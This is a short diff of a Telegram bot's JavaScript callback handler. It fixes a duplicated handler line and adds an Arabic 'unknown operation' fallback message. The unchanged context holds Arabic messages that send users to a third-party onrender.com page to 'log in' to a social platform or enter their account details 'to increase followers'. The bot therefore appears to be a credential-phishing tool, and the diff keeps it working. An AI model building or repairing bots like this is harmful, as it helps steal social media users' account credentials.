@@ -858,7 +858,6 @@ bot.on('message', (msg) => {
 });
 
 bot.on('callback_query', (query) => {
-    cbot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const baseUrl = 'https://yyytot.onrender.com'; // Change this to your actual URL
 
@@ -870,6 +869,8 @@ bot.on('callback_query', (query) => {
         message = `يرجى تسجيل الدخول إلى ${getPlatformName(platform)}: ${url}`;
     } else if (action === 'increase') {
         message = `يرجى إدخال معلومات حسابك لزيادة المتابعين على ${getPlatformName(platform)}: ${url}`;
+    } else {
+        message = 'عملية غير معروفة';
     }
 
     bot.sendMessage(chatId, message);
